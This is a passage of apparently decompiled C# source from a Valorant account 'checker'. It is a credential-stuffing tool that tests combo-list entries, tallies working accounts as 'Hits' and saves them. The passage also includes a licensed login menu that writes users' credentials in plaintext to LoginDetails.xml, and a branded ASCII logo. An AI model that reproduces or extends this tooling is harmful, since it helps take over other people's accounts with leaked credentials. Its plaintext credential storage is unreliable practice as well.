					Checker.Increment_CPM++;
					Variables.Hits++;
					Variables.Progress++;
					Combos.Results(text3, "Hits", "Valorant");
				}
				else
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		private static bool AskLogin()
		{
			string text2;
			string text3;
			while (true)
			{
				System.Console.Clear();
				PrintLogo();
				System.Console.WriteLine("\n[1] Login");
				System.Console.WriteLine("[2] Register");
				string a = System.Console.ReadLine();
				if (!(a == "2"))
				{
					if (!(a == "1"))
					{
						continue;
					}
					if (File.Exists("LoginDetails.xml"))
					{
						Array array = File.ReadAllLines("LoginDetails.xml");
						for (int i = 0; i < array.Length; i++)
						{
							string text = (string)((object[])array)[i];
							Array array2 = text.Split(':');
							if (API.Login((string)((object[])array2)[0], (string)((object[])array2)[1]))
							{
								System.Console.Clear();
								PrintLogo();
								System.Console.WriteLine("");
								System.Console.WriteLine("Welcome back, " + User.Username + "...");
								Thread.Sleep(2500);
								return true;
							}
						}
					}
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine();
					System.Console.WriteLine("Username:");
					text2 = System.Console.ReadLine();
					System.Console.WriteLine("Password:");
					StringBuilder stringBuilder = new StringBuilder();
					bool flag = true;
					char c = '\r';
					while (flag)
					{
						char keyChar = System.Console.ReadKey(intercept: true).KeyChar;
						if (keyChar == c)
						{
							flag = false;
							continue;
						}
						System.Console.Write("*");
						stringBuilder.Append(keyChar.ToString());
					}
					text3 = stringBuilder.ToString();
					if (API.Login(text2, text3))
					{
						break;
					}
					System.Console.WriteLine("");
					Colorful.Console.WriteLine("Invalid email/password!", Color.Red);
					Thread.Sleep(1000);
				}
				else
				{
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine();
					System.Console.WriteLine("Username:");
					string username = System.Console.ReadLine();
					System.Console.WriteLine("Password:");
					string password = System.Console.ReadLine();
					System.Console.WriteLine("Email:");
					string email = System.Console.ReadLine();
					System.Console.WriteLine("License:");
					string license = System.Console.ReadLine();
					if (API.Register(username, password, email, license))
					{
						System.Windows.Forms.MessageBox.Show("You have successfully registered!", OnProgramStart.Name, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						Thread.Sleep(1500);
					}
				}
			}
			System.Console.Clear();
			PrintLogo();
			System.Console.WriteLine("");
			System.Console.WriteLine("Welcome back, " + User.Username + "...");
			Thread.Sleep(2500);
			System.Console.Clear();
			PrintLogo();
			API.Log(text2, "Logged in!");
			StreamWriter streamWriter = new StreamWriter("LoginDetails.xml", append: true);
			streamWriter.WriteLine(text2 + ":" + text3);
			return true;
		}

		private static string Parse(string source, string left, string right)
		{
			return source.Split(new string[1]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[1]
			{
				right
			}, StringSplitOptions.None)[0];
		}

		public static void PrintLogo()
		{
			System.Console.WriteLine("");
			Colorful.Console.WriteLine("  ____                       _            _    ___ ___   __     ______  ", Color.BlueViolet);
			Colorful.Console.WriteLine(" | __ )  __ _ _______   ___ | | ____ _   / \\  |_ _/ _ \\  \\ \\   / /___ \\ ", Color.BlueViolet);
			Colorful.Console.WriteLine(" |  _ \\ / _` |_  / _ \\ / _ \\| |/ / _` | / _ \\  | | | | |  \\ \\ / /  __) |    hashkiller#5141", Color.BlueViolet);
			Colorful.Console.WriteLine(" | |_) | (_| |/ / (_) | (_) |   < (_| |/ ___ \\ | | |_| |   \\ V /  / __/     ", Color.BlueViolet);
			Colorful.Console.WriteLine(" |____/ \\__,_/___\\___/ \\___/|_|\\_\\__,_/_/   \\_\\___\\___/     \\_/  |_____|", Color.BlueViolet);
			System.Console.WriteLine("");
		}

		public static string Base64Encode(string plainText)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		}
	}
}
